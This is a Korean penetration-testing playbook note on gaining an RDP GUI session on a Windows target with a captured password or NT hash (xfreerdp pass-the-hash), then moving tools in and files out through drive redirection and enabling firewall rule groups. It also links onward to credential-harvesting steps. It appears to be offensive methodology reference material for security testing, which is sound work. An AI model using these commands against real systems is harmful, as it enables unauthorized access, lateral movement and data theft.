---
tags:
  - 환경/windows
  - 서비스/rdp
시작조건: ["공격 호스트에서 <TARGET>:3389 RDP 응답 확인", "대상의 로컬 또는 도메인 계정 비밀번호 또는 NT hash 확보"]
필요권한: ["대상의 Remote Desktop Services 로그온 권한", "파일 접근·설정 변경은 RDP 세션 내 실제 Windows 계정 권한", "NT hash 사용은 Restricted Admin Mode"]
필요조건: ["공격 호스트에서 <TARGET>:3389 직접 또는 검증된 피벗 경로", "로컬·도메인 범위가 맞는 계정 이름과 비밀번호 또는 NT hash", "NLA·GPO·deny logon 정책에서 GUI 로그온 허용"]
결과: ["<TARGET>의 `<USER>` RDP GUI 세션", "세션 내 `whoami /all`로 확인한 실제 계정·그룹·무결성 수준", "RDP drive redirection이 허용된 경우 파일 반입·회수"]
---

# RDP 로그인과 GUI 세션

## 한 줄 판단

공격 호스트에서 `<TARGET>:3389`에 도달할 수 있고 로컬·도메인 범위가 확인된 `<USER>`의 비밀번호 또는 NT hash를 보유하면, credential 인증과 Remote Desktop 로그온 권한을 별도로 검증해 `<TARGET>`의 GUI 세션을 얻고 세션 내 실제 계정·그룹·무결성 수준과 파일 접근 범위를 확인한다.

## 사용할 때

- 현재 보유 정보·경로: 공격 호스트에서 `<TARGET>:3389/TCP`가 직접 또는 SOCKS·포트 포워딩 경로로 응답하고 `<USER>`의 비밀번호 또는 NT hash를 보유한다.
- 명령 실행 위치: `xfreerdp`는 3389/TCP 경로와 credential을 보유한 공격 호스트에서, `whoami /all`·`net use`·`dir \\tsclient\share`는 성공한 `<TARGET>` RDP 세션 내에서 실행한다.
- 현재 계정·권한: credential 보유는 인증 전 상태, 인증 성공은 계정·비밀번호 또는 hash의 유효성, GUI 세션은 RDP 로그온 권한 확인이다. 세션 성공만으로 로컬 관리자 권한을 추정하지 않는다.
- 지금 가능한 행동: GUI에서 브라우저·문서·Credential Manager·데스크톱 파일을 현재 Windows 계정의 ACL 범위에서 확인하고, drive redirection이 허용되면 `\\tsclient\<SHARE>`로 파일을 반입·회수한다.
- 성공 범위: RDP 인증 창·NLA 통과, GUI 세션, drive redirection, 세션 내 관리자 토큰을 각각 별도로 확인한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치와 네트워크 경로 | 공격 호스트→`<TARGET>:3389/TCP` 직접 또는 검증된 피벗 경로 | `nmap -p3389` 또는 피벗 경로의 TCP 연결 증거 | route·SOCKS·포트 포워딩·방화벽과 RDP listener 확인 |
| 현재 계정 또는 인증 수단 | `<USER>`의 비밀번호 또는 NT hash와 로컬·도메인 범위 | credential 출처와 xfreerdp 인증 결과 | 계정 형식, 도메인, NLA, NT hash 사용 시 Restricted Admin Mode 확인 |
| 현재 권한 | 인증 전에는 대상 권한 미확인 | GUI 로그인 후 `whoami /all` | 인증 실패와 `valid but not allowed`를 구분하고 RDP 그룹·GPO·deny logon 확인 |
| 공격 대상의 조건 | RDP 서비스·NLA·로그온 정책이 `<USER>` GUI 세션을 허용 | 실제 GUI 세션 생성 | 인증만 성공하면 Remote Desktop Users, GPO, deny logon, 동시 세션 제한 확인 |
| 필요한 파일·목록·주소 | `<TARGET>`, `<USER>`, `<PASSWORD>` 또는 `<NTLM_HASH>`, drive redirection용 로컬 경로 | xfreerdp 옵션과 로컬 파일 경로 확인 | 대상·계정 형식·로컬 share 경로 수정 |

## 실행

### 인증·기능 선택

| 보유 자료·목표 | 선택할 방식 | 대상 조건 | 성공 결과 |
|---|---|---|---|
| `<USER>`의 plaintext password로 GUI 로그인 | `/p:<PASSWORD>` | `<TARGET>:3389`, NLA 인증과 Remote Desktop 로그온 허용 | `<USER>`의 RDP GUI 세션 |
| `<USER>`의 NT hash만 보유 | `/pth:<NTLM_HASH>` | `<TARGET>:3389`, Remote Desktop 로그온 허용과 Restricted Admin Mode 활성 | 제한된 자격 증명 위임 방식의 RDP GUI 세션 |
| RDP 세션과 파일 반입·회수가 모두 필요 | password 또는 hash 인증에 `/drive:<SHARE>,<LOCAL_PATH>` 추가 | 대상 정책에서 RDP drive redirection 허용 | GUI 세션 안의 `\\tsclient\<SHARE>` 파일 경로 |

`/drive`는 인증 방식이 아니라 기존 RDP 세션에 파일 전달 채널을 추가하는 옵션이다. NT hash 인증이 실패해도 hash 자체가 틀렸다고 단정하지 말고 Restricted Admin Mode와 다른 SMB·WinRM·WMI 경로를 확인한다.

### Windows 공격 호스트에서 실행

#### 로그인 전 그룹 권한 후보 확인

```powershell
Import-Module .\PowerView.ps1
Get-NetLocalGroupMember -ComputerName '<TARGET>' -GroupName 'Remote Desktop Users'
```

확인할 출력:

- 현재 사용 중인 계정 또는 중첩 도메인 그룹의 `MemberName`과 `MemberSID`.
- 그룹 멤버십은 로그인 후보이며 NLA, deny logon 정책과 방화벽을 통과한 GUI 세션이 최종 성공 기준이다.

### Linux 공격 호스트에서 비밀번호로 실행

#### RDP 접속

```bash
xfreerdp /v:<TARGET> /u:<USER> /p:'<PASSWORD>' /cert:ignore /dynamic-resolution /drive:linux,<OPERATOR_HOME>/Windows
```

확인할 출력:

- GUI 세션, 인증 오류, 로그인 권한 오류.

#### 드라이브 공유

```bash
xfreerdp /v:<TARGET> /u:<USER> /p:'<PASSWORD>' /drive:share,./loot /cert:ignore /dynamic-resolution /drive:linux,<OPERATOR_HOME>/Windows
```

확인할 출력:

- 원격 세션에서 공유 드라이브 표시.

### Windows 대상 호스트에서 RDP 공유 드라이브 확인

원격 Windows에서는 RDP로 공유한 폴더를 `\\tsclient\<SHARE>`에서 확인한다.

```powershell
net use
dir \\tsclient\share
copy \\tsclient\share\tool.exe $env:TEMP\tool.exe
```

`\\tsclient`가 보이지 않으면 Windows 네트워크 검색 설정을 바꾸기 전에 `/drive` 옵션을 넣어 RDP를 다시 연결한다.

#### 네트워크 공유 UI가 비활성화된 경우

```powershell
Get-NetConnectionProfile
whoami /groups | findstr /i "S-1-5-32-544 Administrators"
```

`NetworkCategory`가 `Public`이어도 RDP 드라이브 공유에는 영향이 없을 수 있다. SMB 공유 자체를 활성화해야 하고 관리자 권한이 있다면 다음 설정을 검토한다.

```powershell
Set-NetConnectionProfile -InterfaceIndex <INDEX> -NetworkCategory Private
netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes
netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
```

`not running PowerShell elevated`, `DomainAuthenticated`, `Network List Manager Policies`가 나오면 권한 또는 GPO 제한으로 판단하고 RDP drive, HTTP, WinRM 같은 다른 전송 경로를 선택한다.

### Linux 공격 호스트에서 NT hash로 실행

#### RDP Pass the Hash

```bash
xfreerdp /v:<TARGET> /u:<USER> /pth:<NTLM_HASH> /cert:ignore /dynamic-resolution /drive:linux,<OPERATOR_HOME>/Windows
```

확인할 출력:

- Restricted Admin Mode가 활성화되어야 성공한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| GUI 세션에 로그인된다. | RDP 로그온 권한 확인 | GUI 세션 | `whoami /all`로 계정, 그룹과 무결성 수준 확인 |
| 드라이브 공유로 파일을 주고받을 수 있다. | RDP drive redirection 확인 | 파일 전송 | [[상황별 파일 전송]]에서 필요한 반입·회수 방식 선택 |
| 브라우저, 문서 또는 저장된 credential 위치에 접근할 수 있다. | 사용자 프로필 접근 확인 | 자격 증명 단서 | [[Windows 저장 자격증명 수집]] 또는 [[Windows 파일 자격증명 검색]]으로 분기 |
| valid but not allowed | 계정은 맞지만 RDP 권한 없음 | 시작 상태 유지 | WinRM/SMB 권한, 그룹 멤버십 |
| `Remote Desktop Users` 멤버십만 확인 | RDP 권한 후보이나 실제 세션 미확인 | 시작 상태 유지 | NLA·GPO·방화벽 확인 후 한 번의 실제 로그인 검증 |
| NLA/TLS 오류 | 인증/인증서 문제 | 시작 상태 유지 | `/cert:ignore`, 계정 형식 |
| PtH 실패 | Restricted Admin Mode 비활성 | 시작 상태 유지 | [[Pass the Hash]]에서 WinRM/SMB/WMI 대체 |
| `\\tsclient` 없음 | RDP drive redirection 미설정 | 시작 상태 유지 | `/drive` 옵션으로 재접속 |
| 네트워크 범주 변경 실패 | 관리자 권한 부족 또는 GPO | 시작 상태 유지 | [[상황별 파일 전송]]에서 다른 경로 선택 |

## 확인할 출력과 권한

- 판정 기준: credential 유효성, Remote Desktop 로그인 권한, GUI 세션, 드라이브 redirection 권한을 구분한다.

## 후속 공격 연결

- [[Windows 파일 자격증명 검색]]
- [[Windows 저장 자격증명 수집]]
- [[Pass the Hash]]
- [[상황별 파일 전송]]

## 관련 서비스

- [[3389_RDP]]

## 관련 상태 라우터

- RDP 로그인 뒤 실제 사용자와 권한을 확인할 때: [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]

## 관련 도구

- [[xfreerdp]]
- [[hydra]]
